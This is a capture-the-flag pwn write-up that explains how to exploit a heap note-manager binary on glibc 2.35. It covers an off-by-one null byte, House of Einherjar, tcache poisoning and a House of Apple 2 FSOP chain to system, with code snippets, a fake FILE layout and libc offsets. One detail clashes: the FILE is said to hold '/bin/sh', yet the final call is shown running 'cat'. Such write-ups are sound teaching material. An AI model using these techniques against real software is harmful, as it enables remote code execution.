# Dead Link — pwn writeup

**CTF:** bcsctf · **Category:** pwn · **Points/Solves:** 200 / Hard
**Flag:** `bcsctf{nU11_byt3_31nh3rj4r_1n_th3_d34d_l1nk_n0de}`
**Target:** `nc 172.16.38.22 6656`

---

## 1. Overview

A classic heap note-manager ("Dead Link" nodes) running on **Ubuntu 22.04 / glibc 2.35**,
x86-64 **PIE + Full RELRO + stack canary + NX**. It hides behind a `/dev/urandom` "human"
gate. The bug is a **single-NULL-byte off-by-one** which, combined with a fake chunk built
inside controllable data, yields **House of Einherjar → overlapping chunks → tcache
poisoning**, and finally a **House of Apple 2 FSOP** on `exit()` to get `system("/bin/sh")`.

Protections:
```
Arch:     amd64-64-little
RELRO:    Full RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      PIE enabled
libc:     2.35-0ubuntu3.14 (from the challenge Docker image)
```

## 2. Reversing the binary

Node structure (per allocation, `malloc(size + 0x10)`):

```c
struct node {
    node    *next;   // user+0x00   (singly linked list)
    uint64_t size;   // user+0x08   (requested size, <= 0x10000)
    char     data[]; // user+0x10   (size bytes)
};
```

Menu actions (numbers are randomised per connection — parse them from the menu text):

* **add**    – `malloc(size+0x10)`, `read_with_null(0, data, size)`, append to list tail.
* **delete** – unlink node from list, store a **dangling pointer in `bin[]`** and `free()` it.
* **change** – walk to index, `read_with_null(0, node->data, node->size)`.
* **print**  – prints each live node's inline data.
* **binview**– for each `bin[i]` (freed!) prints `next=%p size=%lu data=%s`  → **UAF leak**.

### The gate

```c
read("/dev/urandom", gate_token, 0x20);
printf("[*] Diagnostics: system() @ %p\n", dead_filter);  // PIE leak (not system!)
printf("[*] Token: "); // prints the 32 token bytes in hex
read(0, buf, 0x20);
for (i=0;i<32;i++)
    if ((((i*7) ^ buf[i] ^ 0xc3) & 0xff) != gate_token[i]) fail();
```

The token is printed to us, so we compute the required input directly:

```python
inp = bytes(((i*7) ^ 0xc3 ^ tok[i]) & 0xff for i in range(32))
```

We also get a free **PIE leak** from the `%p` (it prints `dead_filter`, PIE base = leak - 0x1369).

### The off-by-one

`read_with_null()` reads `size` bytes then writes a terminating NUL at `data[n]`.
When you send **exactly `size`** bytes (no newline) and `size ≡ 8 (mod 16)`, that NUL lands
on the **least-significant byte of the next chunk's size field** — a poison-null off-by-one.

Verified: two 0x100 chunks; overflowing the first with exactly `0xe8` bytes turns the
second chunk's size `0x101 → 0x100` (clears PREV_INUSE).

## 3. Leaks

Both leaks come from `binview` reading freed chunks (`bin[]` keeps dangling pointers):

* **libc** – free a large chunk (`0x500`) → it goes to the **unsorted bin**, so its
  `fd = main_arena+0x60`. `libc_base = leak - 0x21ace0`.
* **heap** – free a small chunk → tcache; its safe-linked `fd = (user_addr >> 12)`.
  `heap_base = leak << 12` (use a **page-0** chunk so the shift lands on the heap base).

> Note: on the remote the libc mapped at `0x7c…`/`0x75…` (not `0x7f…`), so detect the
> libc pointer as "the large one", not by a `0x7f` prefix.

## 4. Overlap — House of Einherjar

`add` always writes `node->next=0` and `node->size` at user+0/user+8, so we can **never**
control those two words of a live chunk. The classic poison-null recipes that need to forge
`fd/bk` on a reclaimed chunk don't apply. Instead we place the **fake chunk entirely inside
a chunk's `data` region** (writable from user+0x10 via `change`), self-link its `fd`/`bk`,
and use the off-by-one only to clear the victim's PREV_INUSE.

Layout (contiguous from a clean top): `PC(0x420) | V(0x500) | C(0x500) | …barrier`

Inside `PC`'s data we craft a fake free chunk `F` at `heap+0x2e0`:

```
F.size        = 0x400          # matches V.prev_size
F.fd = F.bk   = &F             # self-linked -> passes unlink_chunk()
F.fd_nextsize = 0
V.prev_size   = 0x400          # so V consolidates back into F
```

The same `change('PC')` sends **exactly 0x408 bytes**, so the terminating NUL clears
`V.size`'s PREV_INUSE. Then `delete('V')` triggers backward consolidation:

```
_int_free(V): prev_inuse(V)==0 -> p = V-0x400 = F ; chunksize(F)==0x400  OK
              unlink_chunk(F): F.fd->bk==F && F.bk->fd==F  OK
              -> merged 0x900 unsorted chunk at F, which OVERLAPS the still-live PC
```

## 5. tcache poisoning → `_IO_list_all`

Carve three `0x90` chunks out of the overlapping `0x900` region, free two into
`tcache[0x90]`, and because the freed chunks live **inside PC's writable data**, use
`change('PC')` to overwrite the tcache head's `fd` (safe-linked):

```python
poison = (chunk_addr >> 12) ^ (io_list_all - 0x10)
```

Two allocations later `malloc` returns `_IO_list_all-0x10`; `add` writes our fake-FILE
pointer straight into **`_IO_list_all`**.

## 6. House of Apple 2 → RCE

The fake `_IO_FILE` (built in a spare note's data so we control every byte, incl. offset 0)
uses the well-known wide-vtable path:

```
_flags        = " /bin/sh\0"   # low byte 0x20 -> bits 0x2/0x8 clear (needed by the path)
_IO_write_ptr = 1, _IO_write_base = 0   # so _IO_flush_all calls _IO_OVERFLOW
_mode         = 0
vtable        = libc + _IO_wfile_jumps
_wide_data    = &W ;  W._wide_vtable = &Vt ;  Vt.__doallocate(0x68) = system
```

`exit()` (menu "Exit") → `_IO_cleanup` → `_IO_flush_all` walks `_IO_list_all` → our FILE →
`_IO_wfile_overflow` → `_IO_wdoallocbuf` → `_IO_WDOALLOCATE` = `system(fp)` →
`system(" cat /script/flag.txt")`.

## 7. Key libc offsets (glibc 2.35-0ubuntu3.14)

```
main_arena       0x21ac80     (unsorted fd = base + 0x21ace0)
system           0x50d70
_IO_list_all     0x21b680
_IO_wfile_jumps  0x2170c0
```

## 8. Flag

```
bcsctf{nU11_byt3_31nh3rj4r_1n_th3_d34d_l1nk_n0de}
```

The flag name confirms the intended path: **null-byte off-by-one → House of Einherjar**.

## 9. Files

* `solve.py` – full exploit (run: `python3 solve.py REMOTE HOST=172.16.38.22 PORT=6656`)
* `helper.py` – gate bypass + menu I/O helpers
